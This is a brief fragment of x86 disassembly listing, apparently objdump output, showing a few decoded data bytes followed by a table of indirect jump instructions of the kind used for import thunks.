  42463a:	add    BYTE PTR [eax],al
  42463c:	ds pop ebx
  42463e:	add    BYTE PTR [eax],al
  424640:	ds pop ebx
  424642:	add    BYTE PTR [eax],al
  424644:	ds pop ebx
	...
  424672:	jmp    DWORD PTR ds:0x42512c
  424678:	jmp    DWORD PTR ds:0x425130
  42467e:	jmp    DWORD PTR ds:0x425134
  424684:	jmp    DWORD PTR ds:0x425138
  42468a:	jmp    DWORD PTR ds:0x42513c
  424690:	jmp    DWORD PTR ds:0x425144
  424696:	jmp    DWORD PTR ds:0x425148
